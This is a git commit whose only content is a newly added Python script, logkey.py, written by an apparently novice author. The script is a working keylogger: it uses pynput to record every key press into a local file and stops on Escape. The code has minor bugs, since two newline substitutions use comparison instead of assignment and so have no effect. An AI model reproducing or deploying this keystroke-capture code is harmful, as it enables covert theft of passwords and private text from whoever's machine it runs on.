80ea119332ad0701a95d453afca5810ae4b9e838
Newbie01P <ong.hao.tranvan@gmail.com>
2023-04-30 23:22:38 +0700

    BRUH

---
+++ logkey.py
@@ -0,0 +1,20 @@
+from pynput.keyboard import Listener
+
+
+
+def anoymous(key) :
+    key=str(key)
+    key=key.replace("'","")
+    if key == "Key.esc" : 
+        raise SystemExit(0) 
+    elif key == "Key.alt_l" :
+        key == "\n"  
+    elif key == "Key.tab" :
+        key == "\n"
+    
+
+    with open( "adu.txt" ,"a") as file :
+        file.write(key) 
+with Listener(on_press=anoymous) as listener :
+    listener.join()
+
